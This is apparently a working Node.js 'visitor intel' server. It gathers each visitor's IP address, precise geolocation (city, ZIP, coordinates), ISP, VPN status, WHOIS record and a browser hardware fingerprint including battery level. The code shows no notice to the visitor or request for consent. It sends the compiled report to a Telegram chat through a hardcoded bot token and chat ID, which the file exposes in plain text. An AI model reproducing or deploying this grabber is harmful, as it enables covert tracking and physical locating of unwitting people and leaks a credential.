const express = require("express");
const path = require("path");
const app = express();
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
const TELEGRAM_CHAT_ID = "8059402181";

// WHOIS RDAP Lookup Function
async function getWhois(ip) {
  try {
    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
    const data = await res.json();
    return {
      network: data.name || "N/A",
      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
      handle: `${data.startAddress} - ${data.endAddress}`,
      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3] || "N/A",
      country: data.country || "N/A"
    };
  } catch (e) { return null; }
}

async function sendTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
    });
  } catch (err) { console.log("Telegram Error"); }
}

app.post("/visit", async (req, res) => {
  try {
    const client = req.body;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
    const ua = req.headers["user-agent"] || "";

    // 1. IP-API Data
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=16777215`);
    const geo = await geoRes.json();

    // 2. WHOIS Data
    const whois = await getWhois(ip);

    // 3. Device Logic
    const isMobile = /mobile|android|iphone|ipad/i.test(ua);

    const report = `
<b>🚀 FULL VISITOR INTEL REPORT (100% CAPTURE)</b>
-----------------------------------------
<b>🌐 IP & ISP DATA</b>
• <b>IP Address:</b> <code>${ip}</code>
• <b>ISP:</b> ${geo.isp}
• <b>Organization:</b> ${geo.org || "N/A"}
• <b>AS/Network:</b> ${geo.as}
• <b>Mobile Network:</b> ${geo.mobile ? "Yes 📱" : "No"}
• <b>Proxy/VPN:</b> ${geo.proxy ? "Detected ⚠️" : "No"}
• <b>Hosting/DC:</b> ${geo.hosting ? "Yes (Server/Bot)" : "No (User)"}

<b>📡 WHOIS / NETWORK</b>
• <b>Org:</b> ${whois?.org || "N/A"}
• <b>Network:</b> ${whois?.network || "N/A"}
• <b>CIDR:</b> ${whois?.cidr || "N/A"}
• <b>Handle:</b> ${whois?.handle || "N/A"}
• <b>Country:</b> ${whois?.country || geo.countryCode || "N/A"}

<b>📍 GEOGRAPHICAL INFO</b>
• <b>Country:</b> ${geo.country} (${geo.countryCode})
• <b>Region/City:</b> ${geo.regionName} / ${geo.city}
• <b>ZIP Code:</b> ${geo.zip}
• <b>Lat/Lon:</b> ${geo.lat}, ${geo.lon}
• <b>Timezone:</b> ${geo.timezone} (Client: ${client.browser?.tz})

<b>💻 HARDWARE FINGERPRINT</b>
• <b>GPU:</b> <code>${client.gpu}</code>
• <b>CPU Cores:</b> ${client.hw?.cores}
• <b>RAM:</b> ~${client.hw?.ram} GB
• <b>Platform:</b> ${client.hw?.platform}
• <b>Resolution:</b> ${client.display?.res} (${client.display?.pixelRatio}x density)
• <b>Touchscreen:</b> ${client.hw?.touch > 0 ? "Yes" : "No"}

<b>📱 DEVICE</b>
• <b>Type:</b> ${isMobile ? "Mobile" : "Desktop"}

<b>🔋 LIVE DEVICE STATUS</b>
• <b>Battery:</b> ${client.battery?.lvl || "N/A"} (${client.battery?.status || "N/A"})

<b>🧠 BROWSER IDENTIFIER</b>
• <b>Languages:</b> ${client.browser?.lang}
• <b>Referrer:</b> ${client.browser?.ref}
• <b>User-Agent:</b> <code>${ua}</code>

<b>⏰ LOGGED AT:</b> ${new Date().toUTCString()}
-----------------------------------------
`;

    await sendTelegram(report);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: "error" });
  }
});

app.get("/", (req, res) => res.sendFile(path.join(__dirname, "index.html")));
app.listen(3000, () => console.log("Intel Server Active..."));
